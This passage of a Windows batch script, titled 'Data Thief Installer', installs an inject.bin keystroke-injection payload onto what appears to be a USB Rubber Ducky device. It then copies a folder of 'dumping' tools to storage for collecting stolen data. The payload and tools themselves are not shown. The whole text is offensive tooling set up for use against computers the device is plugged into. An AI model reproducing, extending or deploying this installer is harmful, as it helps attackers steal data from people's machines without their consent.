@echo Installing inject.dat on device "%ducky%"...
if exist "%ducky%\inject.bin" del /f "%ducky%\inject.bin" >nul
if exist "%ducky%\inject.bin" @echo Failed to remove "%ducky%\inject.bin"!
if exist "%ducky%\inject.bin" goto end
copy /y "%TEMP%\inject.bin" "%ducky%\inject.bin" >nul
if not exist "%ducky%\inject.bin" @echo Failed to install the inject.dat file on "%ducky%"
if not exist "%ducky%\inject.bin" goto end
if exist "%ducky%\inject.bin" @echo Successfully installed the inject.dat on "%ducky%"
:install_data
@echo Copying extra dumping data...
if not exist "%storage%\Data" mkdir "%storage%\Data"
if not exist "%storage%\Data" @echo ERROR - Unable to create "%storage%\Data"!
if not exist "%storage%\Data" goto end
xcopy /E /R /V /H /Y /Q "Tools\Data" "%storage%\Data"
if not exist "%storage%\Data\Backups" mkdir "%storage%\Data\Backups"
@echo Installation should be a success. Thanks for nothing.
:end
Title = Data Thief Installer
if exist "%TEMP%\inject.txt" del /f "%TEMP%\inject.txt"
if exist "%TEMP%\inject.dat" del /f "%TEMP%\inject.dat"
pause >nul
